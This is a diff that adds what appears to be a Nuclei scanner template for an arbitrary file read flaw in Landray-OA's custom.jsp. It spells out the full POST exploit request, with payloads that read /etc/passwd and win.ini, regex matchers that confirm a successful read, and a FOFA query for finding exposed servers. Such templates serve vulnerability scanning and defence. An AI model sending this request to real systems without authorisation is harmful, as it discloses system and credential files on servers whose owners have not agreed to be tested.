@@ -1,0 +1,47 @@
+id: landray-oa-lfi
+
+info:
+  name: Landray-OA custom.jsp - Arbitary File Read
+  author: SleepingBag945
+  severity: high
+  reference:
+    - https://github.com/tr0uble-mAker/POC-bomber/blob/main/pocs/web/landray/landray_oa_custom_jsp_fileread.py
+    - https://blog.csdn.net/xd_2021/article/details/121893236
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="Landray-OA系统"
+  tags: landray,oa,lfi
+
+http:
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        
+        var={"body":{"file":"{{command}}"}}
+
+    payloads:
+      command:
+        - 'file:///etc/passwd'
+        - 'file:///c://windows/win.ini'
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "for 16-bit app support"
+          - "root:.*:0:0:"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "JSESSIONID="
+
+      - type: status
+        status:
+          - 200
